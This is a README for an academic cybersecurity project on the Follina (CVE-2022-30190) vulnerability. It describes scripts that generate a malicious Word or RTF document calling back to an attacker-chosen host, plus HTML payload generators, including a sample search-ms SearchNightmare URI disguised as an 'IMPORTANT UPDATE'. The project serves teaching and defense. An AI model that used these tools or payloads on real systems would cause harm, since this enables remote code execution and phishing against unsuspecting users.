# five-nights-at-follina-s
A Fullstack Academy Cybersecurity project examining the full cycle of the Follina (CVE-2022-30190) vulnerability, from exploit to detection and defense.

Team:
[Brian Aldrich](https://github.com/SB-Aldrich)
[YoungWa Kim](https://github.com/T4369)
[Jay O'Neill](https://github.com/rhomv)
[Binyang Jeffrey Xu](https://github.com/jeffymcjeffface)

This set of tools assumes that you have a web host or can spin up a simple webserver using Python to host the generated or example payload files. Please use these tools only on VMs or other disposable environments!

# Offensive Tools
To create the Microsoft Word document with the Follina exploit, run docgen_v3.py, using the following options
--extention/-e : change the document output from .doc (default) to rtf for a zero click attack. -e rtf
--ip_address/-ip : change the IP address the document will try to reach out to (detault is 10.0.2.15).
--port/-p : changes the port it will try to reach out to (default is 8000)

To create a payload html file, use generate_payload.py with either the `poc` subcommand to generate a proof of concept payload that opens the Windows Calculator or the `custom` subcommand to generate a payload with your own script.
Examples:
`python generate_payload.py poc -o test.html` will generate the calculator payload in test.html
`python generate_payload.py custom -o test.html -p "search-ms:query=procmon.exe&crumb=location:%5C%5Clive.sysinternals.com%5Ctools&displayname=IMPORTANT%20UPDATE"` will generate test.html as a custom payload with the SearchNightmare exploit

Example payloads can be found in the "Example Payloads" folder.

# Defensive Tools
